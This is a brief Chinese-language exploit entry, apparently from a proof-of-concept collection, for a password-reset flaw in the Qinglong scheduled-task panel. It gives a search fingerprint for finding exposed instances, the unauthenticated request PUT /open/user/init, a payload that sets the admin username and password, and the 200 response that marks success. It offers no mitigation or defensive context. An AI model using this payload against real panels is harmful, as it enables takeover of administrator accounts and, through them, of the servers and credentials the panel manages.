# 青龙面板userinit存在密码重置漏洞

青龙面板 ｜ 其他 ｜ —
- **指纹**：`app="青龙-定时任务管理面板"`
- **请求**：`PUT /open/user/init HTTP/1.1`

**Payload**
```
username=admin&password=sfenkjyf13984!!
```
- **响应特征**：200